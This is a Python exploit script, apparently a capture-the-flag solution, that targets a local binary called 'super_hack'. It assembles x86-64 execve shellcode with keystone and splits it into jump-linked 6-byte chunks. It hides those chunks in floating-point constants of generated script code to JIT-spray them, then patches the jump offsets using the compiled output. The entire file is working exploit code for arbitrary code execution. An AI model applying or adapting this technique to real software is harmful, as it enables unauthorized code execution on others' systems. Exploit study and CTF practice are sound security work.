from argparse import ArgumentParser

from construct import Float64l
from binascii import unhexlify
from subprocess import run

from keystone import *
from pwn import *

JMP = b"\xeb\x41"

ASM = [
    "xor rax, rax",
    "mov rdi,QWORD PTR [rbp+0x28]",
    "push rax",
    "add al, 8",
    "mov rdx, rsp",
    "mov rcx, rdi",
    "sub rcx, rax",
    "push rcx",
    "push rdi",
    "add rdi, rax",
    "push rdi",
    "add rdi, rax",
    "push rdi",
    "mov rsi, rsp",
    "add rdi, rax",
    "mov al, 59",
    "int3"
]

ASM = [
    "xor eax, eax",
    "mov rdx,QWORD PTR [rbp+0x28]",
    "push rax",
    "add al, 8",
    "mov r11, rsp",
    "mov rcx, rdx",
    "sub cl, al",
    "push rcx",
    "push rdx",
    "add dl, al",
    "push rdx",
    "add dl, al",
    "push rdx",
    "push rdx",
    "mov rsi, rsp",
    "add dl, al",
    "mov al, 59",
    "mov rdi, rdx",
    "mov rdx, r11",
    "syscall"
]



def make_code(fs):
    lines = ["function y(t)"]

    for i, f in enumerate(fs):
        lines.append(f"t[{f}]=1")

    lines.append("end\nz={}")
    lines.append("y(z)\ny(z)\ncargo(y,56)\ny(z,9.65137644e-315,3.283499e-317,2.449201474276e-312,5.93e-322,6.195235251138349e+223,2.3576569733781567e+257,5.377079913981089e+228,1.47266e-319)")
    return "\n".join(lines)


def main():
    parser = ArgumentParser()
    parser.add_argument("outfile", type=str)
    args = parser.parse_args()

    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    fs = []
    blob = b""

    bss = []

    for line in ASM:
        asm_bytes = bytes(ks.asm(line)[0])
        bss.append(asm_bytes)
        if len(asm_bytes) > 6:
            print(f'Instruction too long - "{line}"')
            return
        if len(asm_bytes) + len(blob) > 6:
            fs.append(Float64l.parse(blob.ljust(6, b"\x90") + JMP))
            blob = asm_bytes
        else:
            blob += asm_bytes
    if len(blob) > 0:
        fs.append(Float64l.parse(blob.ljust(6, b"\x90") + JMP))

    code = make_code(fs)

    print(disasm(b"".join(bss), arch = 'amd64'))
    print(f"{len(code)}/433")
    if len(code) > 433:
        print("Too long!")
        return
  
    with open(args.outfile, "w") as f:
        f.write(code)

    compiled = unhexlify(run(["./super_hack", args.outfile], capture_output=True).stderr)
    compiled = compiled[compiled.find(Float64l.build(fs[0])) + 8:]
    diffs = []
    for i in range(1, len(fs)):
        fb = Float64l.build(fs[i])
        diff = compiled.find(fb)
        diffs.append(diff)
        compiled = compiled[diff+8:]
    
    new_fs = []
    for i in range(len(fs) - 1):
        fb = Float64l.build(fs[i])[:-1]
        new_fs.append(Float64l.parse(fb + bytes([diffs[i]])))
    new_fs.append(fs[-1])


    code = make_code(new_fs)
    print(f"{len(code)}/433")
    with open(args.outfile, "w") as f:
        f.write(code)

if __name__ == '__main__':
    main()
